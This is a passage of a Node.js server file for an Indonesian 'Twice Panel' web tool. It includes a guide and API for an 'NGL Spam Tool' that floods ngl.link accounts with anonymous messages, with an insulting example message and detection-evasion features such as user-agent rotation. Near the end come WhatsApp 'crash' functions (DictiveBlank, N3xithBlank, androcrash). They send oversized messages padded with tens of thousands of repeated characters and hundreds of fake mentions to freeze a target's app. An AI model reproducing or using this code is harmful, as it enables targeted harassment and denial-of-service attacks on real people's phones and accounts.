        .guide-header {
          text-align: center;
          margin-bottom: 40px;
          padding: 40px 20px;
          background: rgba(255, 255, 255, 0.05);
          backdrop-filter: blur(15px);
          border: 1px solid rgba(255,255,255,0.15);
          border-radius: 18px;
          position: relative;
          overflow: hidden;
        }

        .guide-header::before {
          content: '';
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          height: 3px;
          background: linear-gradient(90deg, var(--primary), var(--secondary));
          border-radius: 18px 18px 0 0;
        }

        .guide-header h1 {
          font-family: 'Orbitron', sans-serif;
          font-size: 2.5rem;
          font-weight: 800;
          color: #fff;
          margin-bottom: 15px;
          text-shadow: 0 0 20px rgba(255,255,255,0.3);
        }

        .guide-header p {
          color: #a0a0c0;
          font-size: 1.2rem;
          margin-bottom: 20px;
        }

        .user-badge {
          display: inline-flex;
          align-items: center;
          gap: 10px;
          background: rgba(255, 255, 255, 0.1);
          padding: 12px 24px;
          border-radius: 50px;
          border: 1px solid rgba(255,255,255,0.2);
          backdrop-filter: blur(10px);
          font-weight: 600;
        }

        /* Layout */
        .guide-grid {
          display: grid;
          grid-template-columns: 1fr 350px;
          gap: 30px;
          margin-bottom: 50px;
        }
        
        @media (max-width: 768px) {
          .guide-grid {
            grid-template-columns: 1fr;
          }
        }
        
        .main-content {
          display: flex;
          flex-direction: column;
          gap: 25px;
        }
        
        .sidebar {
          display: flex;
          flex-direction: column;
          gap: 25px;
        }

        /* Cards */
        .card {
          background: rgba(255, 255, 255, 0.05);
          backdrop-filter: blur(15px);
          border: 1px solid rgba(255,255,255,0.15);
          border-radius: 18px;
          padding: 28px;
          position: relative;
          overflow: hidden;
          animation: fadeInUp 0.6s ease forwards;
        }

        .card::before {
          content: '';
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          height: 3px;
          background: linear-gradient(90deg, var(--primary), var(--secondary));
          border-radius: 18px 18px 0 0;
        }

        .card-header {
          display: flex;
          align-items: center;
          gap: 12px;
          margin-bottom: 20px;
        }

        .card-header i {
          font-size: 1.5rem;
          background: linear-gradient(135deg, var(--primary), var(--secondary));
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
        }

        .card-header h2 {
          font-family: 'Orbitron', sans-serif;
          font-size: 22px;
          font-weight: 700;
          color: #fff;
          text-shadow: 0 0 15px rgba(255,255,255,0.3);
        }

        /* Steps */
        .step {
          display: flex;
          gap: 15px;
          margin-bottom: 25px;
          padding: 20px;
          background: rgba(255, 255, 255, 0.03);
          border-radius: 12px;
          border: 1px solid rgba(255,255,255,0.1);
        }

        .step-number {
          display: flex;
          align-items: center;
          justify-content: center;
          width: 40px;
          height: 40px;
          background: linear-gradient(135deg, var(--primary), var(--secondary));
          color: white;
          border-radius: 50%;
          font-weight: 600;
          flex-shrink: 0;
        }

        .step-content h3 {
          color: white;
          margin-bottom: 10px;
          font-size: 1.2rem;
          font-weight: 600;
        }

        /* Buttons - Updated to match iPhone Quote Generator */
        .btn-group {
          display: flex;
          gap: 15px;
          margin-top: 30px;
          flex-wrap: wrap;
          justify-content: center;
        }

        .btn {
          display: inline-flex;
          align-items: center;
          gap: 10px;
          padding: 15px 30px;
          border-radius: 12px;
          text-decoration: none;
          font-weight: 600;
          transition: all 0.3s ease;
          border: none;
          cursor: pointer;
          font-size: 16px;
          background: linear-gradient(135deg, var(--primary), var(--secondary));
          color: white;
          box-shadow: 0 5px 15px rgba(123, 92, 245, 0.4);
          letter-spacing: 0.5px;
        }

        .btn:hover {
          transform: translateY(-3px);
          box-shadow: 0 8px 20px rgba(123, 92, 245, 0.6);
        }

        .btn:active {
          transform: translateY(1px);
        }

        .btn-secondary {
          background: rgba(255, 255, 255, 0.1);
          color: var(--text);
          border: 1px solid rgba(255,255,255,0.2);
          box-shadow: none;
        }

        .btn-secondary:hover {
          background: rgba(255, 255, 255, 0.15);
          box-shadow: 0 8px 20px rgba(255, 255, 255, 0.1);
        }

        /* Quick Links */
        .quick-links {
          display: flex;
          flex-direction: column;
          gap: 10px;
        }

        .quick-link {
          display: flex;
          align-items: center;
          gap: 12px;
          padding: 15px;
          background: rgba(255, 255, 255, 0.05);
          border-radius: 12px;
          text-decoration: none;
          color: var(--text);
          transition: all 0.3s ease;
          border: 1px solid rgba(255,255,255,0.1);
        }

        .quick-link:hover {
          background: rgba(255, 255, 255, 0.1);
          transform: translateX(5px);
        }

        /* Status Indicators */
        .status-indicators {
          display: flex;
          flex-direction: column;
          gap: 10px;
        }

        .status-item {
          display: flex;
          align-items: center;
          gap: 8px;
          padding: 12px 16px;
          background: rgba(255, 255, 255, 0.05);
          border-radius: 12px;
          border: 1px solid rgba(255,255,255,0.1);
        }

        .status-dot-small {
          width: 8px;
          height: 8px;
          border-radius: 50%;
          background: #00ff00;
        }

        .status-active {
          background: rgba(0, 255, 0, 0.1);
          border-color: rgba(0, 255, 0, 0.3);
        }

        .status-warning {
          background: rgba(255, 153, 0, 0.1);
          border-color: rgba(255, 153, 0, 0.3);
        }

        /* Content Boxes */
        .highlight-box {
          background: linear-gradient(135deg, rgba(157, 78, 221, 0.1), rgba(76, 201, 240, 0.1));
          border: 1px solid rgba(157, 78, 221, 0.3);
          padding: 20px;
          border-radius: 12px;
          margin: 15px 0;
        }

        .warning-box {
          background: rgba(255, 0, 0, 0.1);
          border-left: 4px solid var(--primary);
          padding: 15px;
          border-radius: 8px;
          margin: 20px 0;
        }

        .warning-box p {
          margin: 0;
          color: #ff9999;
          font-size: 14px;
        }

        .note-box {
          background: rgba(173, 74, 231, 0.1);
          border-left: 4px solid #FFF900;
          padding: 15px;
          border-radius: 8px;
          margin: 20px 0;
        }

        .note-box p {
          margin: 0;
          color: #F9F444;
          font-size: 14px;
        }

        /* Stats Grid */
        .stats-grid {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
          gap: 15px;
          margin: 20px 0;
        }

        .stat-item {
          text-align: center;
          padding: 15px;
          background: rgba(255, 255, 255, 0.05);
          border-radius: 12px;
          border: 1px solid rgba(255,255,255,0.1);
        }

        .stat-value {
          font-size: 1.8rem;
          font-weight: 700;
          margin-bottom: 5px;
          background: linear-gradient(135deg, var(--primary), var(--secondary));
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
        }

        /* Tags */
        .tags {
          display: flex;
          flex-wrap: wrap;
          gap: 8px;
          margin-top: 15px;
        }

        .tag {
          display: inline-block;
          padding: 6px 12px;
          background: rgba(76, 201, 240, 0.2);
          color: var(--muted);
          border-radius: 20px;
          font-size: 0.8rem;
          font-weight: 500;
          border: 1px solid rgba(76, 201, 240, 0.3);
        }

        /* Animations */
        @keyframes fadeInUp {
          0% { opacity: 0; transform: translateY(20px); }
          100% { opacity: 1; transform: translateY(0); }
        }

        /* Responsive */
        @media (max-width: 768px) {
          .guide-header h1 {
            font-size: 2rem;
          }
          
          .guide-header p {
            font-size: 1rem;
          }
          
          .btn {
            padding: 12px 20px;
            font-size: 14px;
          }
          
          .card {
            padding: 20px;
          }
        }
      </style>
  </head>
  <body>
    <div class="container">
      <!-- Server Status Banner -->
      <div class="server-banner">
        <video class="banner-video" autoplay muted loop playsinline>
          <source src="https://files.catbox.moe/ygv8bt.mp4" type="video/mp4">
          Your browser does not support the video tag.
        </video>
        <div class="banner-content">
          <div class="banner-title">Twice</div>
          <div class="banner-time">
            <i class="fas fa-clock"></i>
            <span id="currentTime">Loading...</span>
          </div>
        </div>
        <div class="status-indicator">
          <div class="status-dot"></div>
          <span>Online</span>
        </div>
      </div>

      <!-- Header -->
      <div class="guide-header">
        <h1><i class="fas fa-graduation-cap"></i> Panduan Lengkap</h1>
        <p>Pelajari cara menggunakan NGL Spam Tool dengan efektif dan aman</p>
        <div class="user-badge">
          <i class="fas fa-user-circle"></i>
          <span>Selamat datang, <strong>${username}</strong></span>
        </div>
      </div>
      
      <div class="guide-grid">
        <!-- MAIN CONTENT -->
        <div class="main-content">
          <!-- INTRODUCTION -->
          <div class="card">
            <div class="card-header">
              <i class="fas fa-rocket"></i>
              <h2>Apa itu NGL Spam Tool?</h2>
            </div>
            <p>NGL Spam Tool adalah solusi canggih untuk mengirim pesan anonymous ke akun NGL.link secara otomatis dengan sistem keamanan terintegrasi.</p>
            
            <div class="stats-grid">
              <div class="stat-item">
                <div class="stat-value">${remainingUser}</div>
                <div>Sisa Limit Hari Ini</div>
              </div>
              <div class="stat-item">
                <div class="stat-value">3-8s</div>
                <div>Delay/Pesan</div>
              </div>
              <div class="stat-item">
                <div class="stat-value">100</div>
                <div>Max/Request</div>
              </div>
              <div class="stat-item">
                <div class="stat-value">100</div>
                <div>Limit/Target</div>
              </div>
            </div>

            <div class="highlight-box">
              <i class="fas fa-shield-alt"></i>
              <strong> Sistem Keamanan:</strong>
              <p>Tool ini dilengkapi dengan multiple layer protection untuk mencegah deteksi:</p><br>
              <ul>
                <li><strong>Auto Delay</strong> - Random delay 3-8 detik antar pesan</li>
                <li><strong>Rate Limiting</strong> - Kontrol penggunaan per user dan target</li>
                <li><strong>User Agent Rotation</strong> - Berganti device signature otomatis</li>
                <li><strong>Daily Limits</strong> - Batasan harian untuk mencegah abuse</li>
              </ul>
            </div>
          </div>
          
          <!-- QUICK START -->
          <div class="card">
            <div class="card-header">
              <i class="fas fa-play-circle"></i>
              <h2>Panduan Cepat</h2>
            </div>
            
            <div class="step">
              <div class="step-number">1</div>
              <div class="step-content">
                <h3>Buka NGL Spam Tool</h3>
                <p>Klik menu <strong>"NGL Spam"</strong> di dashboard atau akses langsung di sini</p>
              </div>
            </div>
            
            <div class="step">
              <div class="step-number">2</div>
              <div class="step-content">
                <h3>Isi Form Pengiriman</h3>
                <p>Masukkan username target (tanpa @)<br> misal <b>https://ngl.link/agus</b><br>ambil bagian nama <b>agus</b><br>masukin pesannya dan jumlah pengiriman (1-100)</p>
                <div class="highlight-box">
                  <strong>Contoh:</strong><br>
                  Username: <code>agus</code><br>
                  Pesan: <code>"lu idiot bangsat"</code><br>
                  Jumlah: <code>25</code>
                </div>
              </div>
            </div>
            
            <div class="step">
              <div class="step-number">3</div>
              <div class="step-content">
                <h3>Periksa Limit & Mulai Pengiriman</h3>
                <p>Pastikan sisa limit mencukupi, lalu klik tombol <strong>"🚀 Mulai Spam"</strong></p>
                <div class="warning-box">
                  <p><i class="fas fa-exclamation-triangle"></i> <strong>Peringatan:</strong> Jangan tutup halaman</strong> selama proses berjalan!
                  </p>
                </div>
              </div>
            </div>

            <div class="note-box">
              <p><i class="fas fa-lightbulb"></i> <strong>Tips:</strong> Untuk hasil terbaik, kirim 40-50 pesan per session dengan jeda 1-2 jam antar session.</p>
            </div>
          </div>

          <!-- LIMIT SYSTEM -->
          <div class="card">
            <div class="card-header">
              <i class="fas fa-chart-bar"></i>
              <h2>Sistem Limit & Batasan</h2>
            </div>
            
            <div class="stats-grid">
              <div class="stat-item">
                <div class="stat-value">200</div>
                <div>Per User/Hari</div>
              </div>
              <div class="stat-item">
                <div class="stat-value">100</div>
                <div>Per Target/Hari</div>
              </div>
              <div class="stat-item">
                <div class="stat-value">100</div>
                <div>Per Request</div>
              </div>
            </div>

            <div class="highlight-box">
              <p><i class="fa-solid fa-circle-info"></i>
              <strong> Informasi Reset:</strong><br>
              Semua limit akan direset otomatis setiap hari pada pukul 00:00 WIB. Pastikan untuk memantau penggunaan harian Anda.</p>
            </div>

            <div class="warning-box">
              <p><i class="fas fa-exclamation-triangle"></i>
                <strong>Penting!</strong> Melebihi limit akan menyebabkan error dan mungkin pembatasan akses sementara.
                </p>
            </div>
          </div>
        </div>
        
        <!-- SIDEBAR -->
        <div class="sidebar">
          <!-- QUICK ACTIONS -->
          <div class="card">
            <div class="card-header">
              <i class="fas fa-bolt"></i>
              <h2>Akses Cepat</h2>
            </div>
            <div class="quick-links">
              <a href="/ngl-spam" class="quick-link">
                <i class="fas fa-paper-plane"></i>
                <span>Mulai Spam</span>
              </a>
              <a href="/dashboard" class="quick-link">
                <i class="fas fa-home"></i>
                <span>Kembali ke Dashboard</span>
              </a>
              <a href="/api/ngl-stats" class="quick-link">
                <i class="fas fa-chart-pie"></i>
                <span>Cek Statistik</span>
              </a>
            </div>
          </div>
          
          <!-- STATUS -->
          <div class="card">
            <div class="card-header">
              <i class="fas fa-info-circle"></i>
              <h2>Status Sistem</h2>
            </div>
            <div class="status-indicators">
              <div class="status-item status-active">
                <div class="status-dot-small"></div>
                <span>Sistem Aktif</span>
              </div>
              <div class="status-item status-active">
                <div class="status-dot-small"></div>
                <span>Keamanan Optimal</span>
              </div>
              <div class="status-item status-warning">
                <div class="status-dot-small" style="background: #ff9900;"></div>
                <span>Reset: 00:00 WIB</span>
              </div>
            </div>
          </div>
          
          <!-- TIPS -->
          <div class="card">
            <div class="card-header">
              <i class="fas fa-lightbulb"></i>
              <h2>Tips Penting</h2>
            </div>
            <ul style="padding-left: 20px; display: flex; flex-direction: column; gap: 10px;">
              <li>Gunakan pesan yang positif dan konstruktif</li>
              <li>Jangan spam target yang sama berulang kali</li>
              <li>Pastikan koneksi internet stabil</li>
              <li>Pantau progress di log real-time</li>
              <li>Hormati privasi dan batasan orang lain</li>
            </ul>
          </div>
          
          <!-- TAGS -->
          <div class="card">
            <div class="card-header">
              <i class="fas fa-tags"></i>
              <h2>Fitur Utama</h2>
            </div>
            <div class="tags">
              <span class="tag">Auto Delay</span>
              <span class="tag">Rate Limiting</span>
              <span class="tag">User Agent Rotation</span>
              <span class="tag">Real-time Logs</span>
              <span class="tag">Progress Tracking</span>
              <span class="tag">Secure API</span>
            </div>
          </div>
        </div>
      </div>
      
      <!-- ACTION BUTTONS -->
      <div class="btn-group">
        <a href="/ngl-spam" class="btn">
          <i class="fas fa-rocket"></i>
          Mulai Gunakan Tool
        </a>
        <a href="/dashboard" class="btn btn-secondary">
          <i class="fas fa-arrow-left"></i>
          Kembali ke Dashboard
        </a>
      </div>
    </div>

    <script>
      // Update current time
      function updateCurrentTime() {
        const now = new Date();
        const timeString = now.toLocaleTimeString('id-ID', {
          hour: '2-digit',
          minute: '2-digit',
          second: '2-digit'
        });
        document.getElementById('currentTime').textContent = timeString;
      }

      // Initialize when page loads
      document.addEventListener('DOMContentLoaded', function() {
        updateCurrentTime();
        
        // Update time every second
        setInterval(updateCurrentTime, 1000);
      });
    </script>
  </body>
  </html>
  `;
  
  res.send(html);
});

// ==================== NGL SPAM ROUTE ==================== //
app.get("/ngl-spam", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  const formattedExp = currentUser ? new Date(currentUser.expired).toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta"
  }) : "-";

  const userId = req.ip || req.headers['x-forwarded-for'] || username;
  const userUsageToday = userTracking.getUserStats(userId);
  const remainingUser = 200 - userUsageToday;
  const usagePercentage = (userUsageToday / 200) * 100;

  // Load template dari file terpisah
  const filePath = path.join(__dirname, "Tools", "spam-ngl.html");
  
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) {
      console.error("❌ Gagal membaca file spam-ngl.html:", err);
      return res.status(500).send("File tidak ditemukan");
    }

    // Replace variables dengan data REAL dari sistem
    let finalHtml = html
      .replace(/\${username}/g, username)
      .replace(/\${formattedExp}/g, formattedExp)
      .replace(/\${userUsageToday}/g, userUsageToday)
      .replace(/\${remainingUser}/g, remainingUser)
      .replace(/\${usagePercentage}/g, usagePercentage);
    
    res.send(finalHtml);
  });
});

// ============================================
// API ENDPOINT - dengan Tracking System
// ============================================
app.get("/api/ngl-stats", requireAuth, (req, res) => {
  const userId = req.ip || req.headers['x-forwarded-for'] || req.cookies.sessionUser || 'anonymous';
  
  res.json({
    userStats: {
      todayUsage: userTracking.getUserStats(userId),
      dailyLimit: 200,
      remaining: 200 - userTracking.getUserStats(userId)
    },
    resetTime: 'Midnight (00:00 WIB)',
    message: 'Statistik penggunaan hari ini'
  });
});

// Endpoint untuk cek target
app.get("/api/ngl-target-stats/:target", requireAuth, (req, res) => {
  const { target } = req.params;
  
  res.json({
    target: target,
    todayReceived: userTracking.getTargetStats(target),
    dailyLimit: 100,
    remaining: 100 - userTracking.getTargetStats(target),
    resetTime: 'Midnight (00:00 WIB)'
  });
});

app.post("/api/ngl-spam-js", requireAuth, async (req, res) => {
  const { target, message, count } = req.body;
  
  // Ambil user ID dari IP atau cookie
  const userId = req.ip || req.headers['x-forwarded-for'] || req.cookies.sessionUser || 'anonymous';
  
  // Hard limits
  const limits = {
    maxPerRequest: 100,      // Max 100 pesan per request
    minDelay: 3000,          // Minimal delay 3 detik
    maxDailyPerUser: 200,    // Max 200 pesan per user per hari
    maxDailyPerTarget: 100   // Max 100 pesan ke target yang sama
  };
  
  if (!target || !message || !count) {
    return res.status(400).json({ error: "Semua field harus diisi" });
  }

  // Cek count tidak melebihi maxPerRequest
  if (count > limits.maxPerRequest) {
    return res.status(400).json({
      error: `❌ Untuk keamanan, maksimal ${limits.maxPerRequest} pesan per request`,
      currentCount: count,
      maxAllowed: limits.maxPerRequest
    });
  }

  if (count < 1) {
    return res.status(400).json({
      error: '❌ Jumlah pesan harus minimal 1'
    });
  }

  // Cek limit harian user
  const userTotal = userTracking.canUserSend(userId, count);
  if (userTotal > limits.maxDailyPerUser) {
    const currentUsage = userTracking.getUserStats(userId);
    return res.status(429).json({
      error: '🚫 Limit harian tercapai!',
      message: `Kamu sudah kirim ${currentUsage} pesan hari ini. Limit: ${limits.maxDailyPerUser}/hari`,
      currentUsage: currentUsage,
      dailyLimit: limits.maxDailyPerUser,
      remaining: limits.maxDailyPerUser - currentUsage,
      resetTime: 'Midnight (00:00 WIB)'
    });
  }

  // Cek limit harian target
  const targetTotal = userTracking.canTargetReceive(target, count);
  if (targetTotal > limits.maxDailyPerTarget) {
    const currentTargetUsage = userTracking.getTargetStats(target);
    return res.status(429).json({
      error: '🚫 Target sudah menerima terlalu banyak pesan!',
      message: `Target ${target} sudah terima ${currentTargetUsage} pesan hari ini. Limit: ${limits.maxDailyPerTarget}/hari`,
      currentTargetUsage: currentTargetUsage,
      targetDailyLimit: limits.maxDailyPerTarget,
      remaining: limits.maxDailyPerTarget - currentTargetUsage,
      resetTime: 'Midnight (00:00 WIB)'
    });
  }

  try {
    // Kirim pesan
    const result = await nglSpam(target, message, parseInt(count));
    
    // UPDATE TRACKING setelah berhasil
    userTracking.updateUser(userId, result.success);
    userTracking.updateTarget(target, result.success);
    
    // Kirim response dengan statistik
    res.json({
      ...result,
      stats: {
        userToday: userTracking.getUserStats(userId),
        userLimit: limits.maxDailyPerUser,
        targetToday: userTracking.getTargetStats(target),
        targetLimit: limits.maxDailyPerTarget,
        remaining: {
          user: limits.maxDailyPerUser - userTracking.getUserStats(userId),
          target: limits.maxDailyPerTarget - userTracking.getTargetStats(target)
        }
      }
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.listen(port, () => {
  console.log(`🚀 Server aktif di ${domain}:${port}`);
});

// ==================== EXPORTS ==================== //
module.exports = { 
  loadAkses, 
  saveAkses, 
  isOwner, 
  isAuthorized,
  saveUsers,
  getUsers
};

// ==================== FUNCTIONS HERE ==================== //
async function N3xithBlank(sock, X) {
const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363321780343299@newsletter",
      newsletterName: "꙳͙͡༑ᐧ𝐒̬𝖎፝͢𝑿 ⍣᳟ 𝐍ͮ𝟑͜𝐮̽𝐕𝐞𝐫̬⃜꙳𝐗ͮ𝐨͢͡𝐗༑〽️" + "ោ៝".repeat(10000),
      caption: "𝐍𝟑𝐱̈𝒊𝐭𝐡 Cʟᴀsˢˢˢ #🇧🇳 ( 𝟑𝟑𝟑 )" + "꧀".repeat(10000),
      inviteExpiration: "999999999"
    }
  };

  await sock.relayMessage(X, msg, {
    participant: { jid: X },
    messageId: null
  });
}

async function DictiveBlank(sock, target) {
  await sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          buttonsMessage: {
            text: "idiot lu" + "ꦽ".repeat(70000),
            contentText: "idiot lu" + "ꦽ".repeat(70000),
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  { length: 700 },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 9999,
              isForwarded: true,
              entryPointConversionSource: "global_search_new_chat",
              entryPointConversionApp: "com.whatsapp",
              entryPointConversionDelaySeconds: 1,
              externalAdReply: {
                title: "masyaallah",
                body: `가이 ${"عليكم السلام".repeat(5000)}`,
                previewType: "PHOTO",
                thumbnail: null,
                mediaType: 1,
                renderLargerThumbnail: true,
                sourceUrl: `https://t.me/${"عليكم".repeat(2000)}sennmods1`,
              },
              urlTrackingMap: {
                urlTrackingMapElements: [
                  {
                    originalUrl: "https://t.me/sennmods1",
                    unconsentedUsersUrl: "https://t.me/sennmods1",
                    consentedUsersUrl: "https://t.me/sennmods1",
                    cardIndex: 1,
                  },
                  {
                    originalUrl: "https://t.me/sennmods1",
                    unconsentedUsersUrl: "https://t.me/sennmods1",
                    consentedUsersUrl: "https://t.me/sennmods1",
                    cardIndex: 2,
                  },
                ],
              },
            },
            headerType: 1,
          },
        },
      },
    },
    { participant: { jid: target } }
  );
}

// ====================== FUNC PANGGILANNYA ====================== //
async function androcrash(sock, target) {
     for (let i = 0; i < 1; i++) {
         await DictiveBlank(sock, target);
         }
     }
     
async function Ipongcrash(sock, target) {
     for (let i = 0; i < 1; i++) {
         await DictiveBlank(sock, target);
         }
     }
     
async function Iponginvis(sock, target) {
     for (let i = 0; i < 1; i++) {
         await DictiveBlank(sock, target);
         }
     }

async function androdelay(X, maxKirim = 1) {
  let count = 0;
  let berhasil = 0;
  let gagal = 0;

  const sendNext = async () => {
    // BERHENTI jika sudah 10 kali
    if (count >= maxKirim) {
      console.log(chalk.green(`
      ╔════════════════════════════╗
      ║       ${chalk.bgBlackBright.bold('📊  HASIL AKHIR')}    
      ╠════════════════════════════╣
      ║ ✅  ${chalk.greenBright('Berhasil:')} ${berhasil}/${maxKirim}
      ║ ❌  ${chalk.redBright('Gagal:')} ${gagal}/${maxKirim}
      ║ 🎯  ${chalk.magentaBright('Target:')} ${X}
      ╚════════════════════════════╝
      `));
      return; // STOP
    }

    try {
      count++;
      
      // Progress bar
      const progress = '█'.repeat(count) + '░'.repeat(maxKirim - count);
      console.log(chalk.cyan(`[${progress}] ${count}/${maxKirim}`));
      
      // kasi hadiah ke target
      await DictiveBlank(X);
      await sleep(2000);
      
      berhasil++;
      console.log(chalk.green(`✅ Pesan ke-${count} berhasil!`));

      // Delay lalu lanjut
      setTimeout(sendNext, 500);
      
    } catch (error) {
      gagal++;
      console.error(chalk.red(`❌ Pesan ke-${count} gagal: ${error.message}`));
      
      // Tetap lanjut meskipun error
      setTimeout(sendNext, 1000);
    }
  };

  sendNext();
}
// ==================== HTML TEMPLATE ==================== //
const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "2-digit",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    })
    : "-";

  return `<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Twice Panel</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800&family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@600;700&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg:#000000; --card:#1a1a1a;
      --text:#ffffff; --muted:#fff;
      --primary:#ff0000; --secondary:#AD4AE7;
      --accent:#666666;
      --pink:#ff005d;
      --ready-green:#00ff00;
    }
    *{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif}
    body{
      background:radial-gradient(circle at 20% 20%,rgba(255,255,255,.1),transparent 30%),
                 radial-gradient(circle at 80% 10%,rgba(255,255,255,.08),transparent 25%),
                 radial-gradient(circle at 50% 90%,rgba(255,255,255,.05),transparent 30%),
                 var(--bg);
      color:var(--text);min-height:100vh;overflow-x:hidden;
    }
    
    /* Server Status Banner - Full Width dengan Video */
    .server-banner {
      border-radius: 15px;
      margin: 20px auto 30px;
      position: relative;
      overflow: hidden;
      min-height: 250px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.6);
      border: 1px solid rgba(255,255,255,0.2);
    }

    .banner-video {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
      z-index: 0;
    }

    /* Overlay tipis biar video tetap kelihatan jelas */
    .server-banner::before {
      content: '';
      position: absolute;
      inset: 0;
      background: linear-gradient(to top, rgba(0,0,0,0.7) 0%, rgba(0,0,0,0.3) 100%);
      z-index: 1;
    }

    /* teks ke bawah kiri */
    .banner-content {
      position: absolute;
      bottom: 15px;
      left: 25px;
      z-index: 2;
      text-align: left;
    }

    .banner-title {
      font-family: 'Orbitron', sans-serif;
      font-size: 20px;
      font-weight: 800;
      color: #fff;
      margin-bottom: 5px;
      text-shadow: 0 0 10px rgba(255,255,255,0.5);
    }

    .banner-subtitle {
      font-size: 13px;
      color: var(--text);
      opacity: 0.9;
      margin-bottom: 3px;
    }

    .banner-time {
      color: #ffff;
      font-size: 12px;
      font-weight: 600;
      display: flex;
      align-items: center;
      gap: 6px;
    }

    /* status indikator ke kanan bawah */
    .status-indicator {
      position: absolute;
      bottom: 15px;
      right: 25px;
      z-index: 2;
      display: flex;
      align-items: center;
      gap: 8px;
      color: #00ff00;
      font-size: 13px;
      font-weight: 600;
      background: rgba(0,0,0,0.4);
      padding: 8px 16px;
      border-radius: 25px;
      backdrop-filter: blur(8px);
      border: 1px solid rgba(0,255,0,0.3);
    }

    /* titik status animasi */
    .status-dot {
      width: 10px;
      height: 10px;
      border-radius: 50%;
      background: #00ff00;
      box-shadow: 0 0 10px #00ff00;
      animation: pulse 1.5s infinite;
    }

    @keyframes pulse {
      0% { 
        opacity: 1; 
        box-shadow: 0 0 0 0 rgba(0,255,0,0.7);
      }
      70% { 
        opacity: 0.7; 
        box-shadow: 0 0 0 10px rgba(0,255,0,0);
      }
      100% { 
        opacity: 1; 
        box-shadow: 0 0 0 0 rgba(0,255,0,0);
      }
    }

    /* Menu Toggle Button */
    .menu-toggle {
      position: fixed;
      top: 20px;
      left: 20px;
      background: rgba(255, 255, 255, 0.15);
      border: 1px solid rgba(255,255,255,0.2);
      color: var(--text);
      width: 45px;
      height: 45px;
      border-radius: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      z-index: 1001;
      backdrop-filter: blur(12px);
      transition: all 0.3s ease;
    }
    
    .menu-toggle:hover {
      background: rgba(255, 255, 255, 0.25);
      transform: scale(1.05);
    }
    
    .menu-toggle i {
      font-size: 20px;
    }

    /* Sidebar */
    .sidebar{
      width: 270px;
      background: rgba(26,26,26,0.95);
      backdrop-filter: blur(12px);
      border-right: 1px solid rgba(255,255,255,0.15);
      padding: 25px 20px;
      position: fixed;
      height: 100vh;
      overflow-y: auto;
      z-index: 1000;
      transform: translateX(-100%);
      transition: transform 0.3s ease;
    }
    
    .sidebar.active {
      transform: translateX(0);
    }
    
    /* Overlay ketika sidebar aktif */
    .sidebar-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.7);
      z-index: 999;
      display: none;
      backdrop-filter: blur(3px);
    }
    
    .sidebar-overlay.active {
      display: block;
    }

    /* Sidebar Header - Untuk mengatur logo dan judul */
    .sidebar-header {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      margin-bottom: 20px;
    }

    /* Efek Instagram Story pada Logo */
    .logo-container {
      position: relative;
      width: 100px;
      height: 100px;
      margin: 0 auto 15px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .logo-ring {
      position: absolute;
      width: 100%;
      height: 100%;
      border-radius: 50%;
      background: conic-gradient(
        #ffffff 0%, 
        #ff0000 30%, 
        #AD4AE7 60%, 
        #ffffff 100%
      );
      animation: rotate 3s linear infinite;
      padding: 4px;
    }

    .logo {
      width: 92px;
      height: 92px;
      border-radius: 50%;
      object-fit: cover;
      display: block;
      z-index: 1;
      position: relative;
      background: #1a1a1a;
      border: 2px solid rgba(255,255,255,0.1);
    }

    @keyframes rotate {
      0% {
        transform: rotate(0deg);
      }
      100% {
        transform: rotate(360deg);
      }
    }
    
    .app-title{
      font-family:'Orbitron',sans-serif;
      font-size: 22px;
      font-weight:800;
      color:#fff;
      text-align:center;
      text-shadow:0 0 12px rgba(255,255,255,0.5);
      margin-bottom: 8px;
    }
    
    /* Gradien Border untuk Execution Mode */
    .access-info{
      font-size: 12px;
      text-align:center;
      color:var(--muted);
      background:rgba(255,255,255,0.1);
      padding: 8px 14px;
      border-radius:10px;
      margin-top: 5px;
      position: relative;
      z-index: 1;
      border: 1px solid rgba(255,255,255,0.1);
    }
    
    .access-info::before {
      content: '';
      position: absolute;
      top: -2px;
      left: -2px;
      right: -2px;
      bottom: -2px;
      background: linear-gradient(45deg, 
        #ffffff 0%, 
        #ff0000 30%, 
        #AD4AE7 60%, 
        #ffffff 100%);
      border-radius: 12px;
      z-index: -1;
      animation: borderGlow 3s linear infinite;
      background-size: 400% 400%;
    }
    
    @keyframes borderGlow {
      0% {
